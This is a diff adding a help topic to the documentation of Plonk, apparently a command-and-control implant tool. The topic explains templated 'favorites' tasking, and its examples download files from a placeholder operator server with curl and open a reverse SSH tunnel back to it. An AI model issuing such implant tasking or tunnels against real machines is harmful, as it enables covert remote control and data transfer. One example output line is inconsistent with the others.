@@ -2,7 +2,7 @@
 # ,help topic text
 # By J. Stuart McMurray
 # Created 20231229
-# Last Modified 20240120
+# Last Modified 20250303
 
 This file contains the information returned by ,help [topic].  Each topic
 starts with the topic name in --'s, has a one-line description used for
@@ -35,6 +35,31 @@ the -self-signed flag.
 Proper TLS certificates may be obtained from Let's Encrypt by pointing a domain
 name at Plonk and using -letsencrypt.  Make sure Let's Encrypt can reach Plonk
 on port 443
+
+-- ,f --
+Favorites file
+
+A bunch of Go templates may be stored in a file ($HOME/plonk_favorites by
+default) which can then be sent to implant using -f.  The same file may be used
+for multiple templates using {{ define "foo" }} blocks and named templates
+selected by passing the template name to ,f.
+
+key=value pairs passed to ,f will be available to templates.
+
+This is all clearer with an example.  Consider the following two-line file:
+
+curl -s https://server/f/{{ .file }}
+{{ define "rssh" }}ssh -f -N -R {{ or .port "5555" }} user@server{{ end }}
+
+Here's the ,f commands and the tasking they produce:
+
+,f                -> curl -s https://server/f/
+,f file=x/y       -> curl -s https://server/f/x/y
+,f rssh           -> ssh -f -N -R 5555
+,f rssh port=1234 -> ssh -f -N -R 1234 user@server
+
+There's also a -dry-run flag to see what'll be queued before it's queued and a
+-file flag to use a different templates file.
 
 -- ,i --
 Implant selection
